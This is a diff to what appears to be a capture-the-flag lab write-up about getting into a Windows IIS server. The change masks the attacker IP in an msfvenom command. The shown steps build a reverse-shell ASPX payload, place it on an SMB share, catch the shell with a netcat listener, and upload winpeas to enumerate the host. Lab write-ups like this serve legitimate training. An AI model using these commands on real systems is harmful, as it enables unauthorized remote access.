@@ -100,7 +100,7 @@ That doesnt seem to work with php files...
 
 Looking up common IIS web application language we can see the common languages are ASP.NET, ISAPI or CGI.
 
-- create msfvenom payload ``msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.2.127.225 LPORT=7777 -f aspx > shell.aspx`` and put on the SMB share
+- create msfvenom payload ``msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.x.x.x LPORT=7777 -f aspx > shell.aspx`` and put on the SMB share
 - startup netcat listener ``nc -nvlp 7777``
 - access the payload we put onto the SMB share to start us a reverse shell. Lets also put on a winpeas to execute now that we're on the system to enumerate some more.
 - we can find our uploaded winpead @ c:\inetpub\wwwroot\nt4wrksv
